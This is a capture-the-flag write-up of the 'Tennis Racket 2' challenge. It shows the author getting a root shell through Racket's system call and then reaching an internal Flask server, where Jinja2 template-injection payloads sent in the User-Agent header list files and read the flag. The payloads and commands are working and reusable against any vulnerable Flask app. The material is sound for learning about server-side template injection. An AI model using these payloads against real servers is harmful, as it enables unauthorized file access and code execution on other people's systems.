# Tennis Racket 2

**Challenge Type: SSTI (Server Side Template Injection)**  
**Challenge Status: Solved**

## Preface

This challenge consists of 2 parts. First being, getting the flag file and second, exploiting an internal webserver.

## Challenge
I just found out my CS Prof is going to be teaching us Python next semester! Lets see if I can find anything useful for next semester on his computer too...

`nc tennis2.nypinfsecctf.tk 8011`

## Solution

1. Connect to the server via netcat

`nc tennis2.nypinfsecctf.tk 8011`

2. Start a root shell using Racket-lang's built-in functions

```rkt
(system "/bin/bash")
```

3. Look for the flag file

```bash
root@fd5a5457d0f5:/# ls -la

total 60
drwxr-xr-x   1 root root 4096 May  5 23:16 .
drwxr-xr-x   1 root root 4096 May  5 23:16 ..
-rwxr-xr-x   1 root root    0 May  5 23:16 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 27 03:49 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  340 May  7 12:16 dev
drwxr-xr-x   1 root root 4096 May  5 23:16 etc
-rw-r--r--   1 root root  183 May  4 02:34 flag
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Apr 27 03:49 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Apr 27 03:49 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Apr 27 03:49 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Apr 27 03:49 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Apr 27 03:49 media
drwxr-xr-x   2 root root 4096 Apr 27 03:49 mnt
drwxr-xr-x   2 root root 4096 Apr 27 03:49 opt
dr-xr-xr-x 298 root root    0 May  7 12:16 proc
drwx------   1 root root 4096 May  4 12:07 root
drwxr-xr-x   1 root root 4096 May  4 12:06 run
lrwxrwxrwx   1 root root    8 Apr 27 03:49 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Apr 27 03:49 srv
dr-xr-xr-x  13 root root    0 May  7 12:16 sys
drwxrwxrwt   1 root root 4096 May  4 12:07 tmp
drwxr-xr-x   1 root root 4096 May  4 12:06 usr
drwxr-xr-x   1 root root 4096 Apr 27 03:52 var
```

4. Print out flag file contents

```bash
root@fd5a5457d0f5:/# cat flag

TODO List:
1. Grade Racket Assignments
2. Test out new website at http://tennisracket2-grade-bot:5000
3. Chase students for tuition fee
4. Mend my broken relationship with my daughter
```

*It doesn't look right...* **Let's try the webserver**

5. Connect to the webserver

```bash
root@fd5a5457d0f5:/# curl http://tennisracket2-grade-bot:5000
    
<h1>Hi! Grade-bot is still a work-in-progress.</h1>
<p>Here is some debug information:</p>
    
curl/7.68.0
```

**Notice that we used `curl` and it returned our `User-Agent`.**

6. Find out the server type

```bash
root@fd5a5457d0f5:/# curl -I http://tennisracket2-grade-bot:5000

HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.9.12
Date: Sat, 07 May 2022 19:51:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 135
Connection: close
```

7. Most popular webserver is Flask. Time to list files

```bash
curl -A "{{url_for.__globals__.os.__dict__.listdir('./')}}" http://tennisracket2-grade-bot:5000
    
<h1>Hi! Grade-bot is still a work-in-progress.</h1>
<p>Here is some debug information:</p>
    
[&#39;flag&#39;, &#39;app.py&#39;]
```

8. We found the flag

```bash
curl -A "{{url_for.__globals__.__builtins__.open('flag').read()}}" http://tennisracket2-grade-bot:5000

<h1>Hi! Grade-bot is still a work-in-progress.</h1>
<p>Here is some debug information:</p>
    
NYP{r5ck3t_fl5sk_sst1}
```

## Ending Note

Flask has many other methods for linking into `__globals__` space. `url_for` is one of them.

# Other Reads

Check out the author's write-up of this challenge. He explains it in more detail together with his thought process.  
https://github.com/Portatolova/NYP-CTF-Challenges/tree/main/2022%20May%20CTF/Programming%20-%20Tennis%20Racket%202